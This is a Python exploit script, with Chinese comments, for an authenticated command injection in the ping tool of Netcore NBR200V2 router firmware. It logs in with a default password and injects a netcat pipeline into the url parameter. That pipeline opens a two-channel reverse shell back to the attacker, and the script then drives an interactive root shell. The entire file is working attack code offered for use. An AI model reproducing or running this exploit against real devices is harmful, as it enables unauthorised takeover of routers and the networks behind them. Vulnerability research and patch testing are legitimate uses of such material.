#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# EXP: Netcore NBR200V2 V1.3.241127 认证后命令注入 —— /ubus network_tools.tools_ping url 参数
# 污点: url -> system("(ping %s -c %d -s %d > %s; touch %s)&")
# 利用条件: 需要有效 web 会话(默认/已知口令登录 session login 获取 ubus_rpc_session)
# 双通道反弹(固件 busybox nc 无 -e): lport=命令输入通道, lport+1=回显输出通道
# 用法: python exp_netcore_nbr200_tools_ping_rce.py <target_ip> [target_port=80] [password=admin] [lhost] [lport=4444]
#   例(模拟环境): python exp_netcore_nbr200_tools_ping_rce.py 192.168.2.234 8080 admin 192.168.2.128 4444

import socket
import sys
import threading
import time
import http.client
import json

NULL_SID = "00000000000000000000000000000000"

def ubus_call(target, tport, sid, obj, method, params, timeout=10):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "call",
                       "params": [sid, obj, method, params]})
    conn = http.client.HTTPConnection(target, tport, timeout=timeout)
    conn.request("POST", "/ubus", body=body, headers={"Content-Type": "application/json"})
    resp = conn.getresponse().read().decode(errors="replace")
    return resp

def main():
    if len(sys.argv) < 2:
        print("Usage: python %s <target_ip> [target_port=80] [password=admin] [lhost] [lport=4444]" % sys.argv[0])
        sys.exit(1)
    target = sys.argv[1]
    tport = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    password = sys.argv[3] if len(sys.argv) > 3 else "admin"
    lhost = sys.argv[4] if len(sys.argv) > 4 else "0.0.0.0"
    lport = int(sys.argv[5]) if len(sys.argv) > 5 else 4444

    rhost = lhost
    if rhost == "0.0.0.0":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((target, tport))
            rhost = s.getsockname()[0]
        finally:
            s.close()

    # 1) 登录拿 session
    print("[*] login root/%s ..." % password)
    resp = ubus_call(target, tport, NULL_SID, "session", "login",
                     {"username": "root", "password": password})
    try:
        data = json.loads(resp)
        sid = data["result"][1]["ubus_rpc_session"]
    except Exception:
        print("[-] login failed: %s" % resp[:300])
        sys.exit(2)
    print("[+] session = %s" % sid)
    print("[*] target = %s:%d  reverse to = %s:%d(cmd)/%d(out)" % (target, tport, rhost, lport, lport + 1))

    cmd_srv = socket.socket(); cmd_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    cmd_srv.bind(("0.0.0.0", lport)); cmd_srv.listen(1); cmd_srv.settimeout(30)
    out_srv = socket.socket(); out_srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    out_srv.bind(("0.0.0.0", lport + 1)); out_srv.listen(1); out_srv.settimeout(30)

    # 2) tools_ping url 注入: 模板 (ping %s -c %d -s %d > %s; touch %s)&
    inject = ";tail -f /dev/null|nc %s %d|/bin/sh|nc %s %d;" % (rhost, lport, rhost, lport + 1)

    def fire():
        try:
            r = ubus_call(target, tport, sid, "network_tools", "tools_ping",
                          {"action": "start", "url": inject, "count": 1, "size": 56, "wanid": 1})
            print("[*] ubus response: %s" % r[:200])
        except Exception as e:
            print("[!] http error (may be harmless): %s" % e)

    threading.Thread(target=fire, daemon=True).start()
    print("[*] exploit sent, waiting for reverse connections ...")

    try:
        cmd_conn, ca = cmd_srv.accept()
        print("[+] cmd channel connected from %s:%d" % ca)
        out_conn, oa = out_srv.accept()
        print("[+] output channel connected from %s:%d" % oa)
    except socket.timeout:
        print("[-] reverse connection timeout (30s). 检查: 口令/端口/防火墙/lhost")
        sys.exit(3)

    out_conn.settimeout(1.0)
    cmd_conn.sendall(b"exec 2>&1\n")
    time.sleep(0.3)
    cmd_conn.sendall(b"id && echo SHELL_OK && pwd\n")

    def reader():
        buf = b""
        while True:
            try:
                data = out_conn.recv(4096)
                if not data:
                    sys.stdout.write("\n[-] output channel closed\n"); sys.stdout.flush(); return
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    sys.stdout.write(line.decode(errors="replace") + "\n"); sys.stdout.flush()
            except socket.timeout:
                continue
            except OSError:
                return

    threading.Thread(target=reader, daemon=True).start()
    time.sleep(1.0)
    print("[*] interactive shell (exit/quit 退出):")

    while True:
        try:
            line = input("")
        except (EOFError, KeyboardInterrupt):
            break
        if line.strip() in ("exit", "quit"):
            break
        try:
            cmd_conn.sendall(line.encode() + b"\n")
        except OSError:
            print("[-] cmd channel broken"); break
        time.sleep(0.2)

    try:
        cmd_conn.sendall(b"exit\n"); time.sleep(0.3)
    except OSError:
        pass
    for x in (cmd_conn, out_conn, cmd_srv, out_srv):
        try: x.close()
        except Exception: pass
    print("[*] done")

if __name__ == "__main__":
    main()
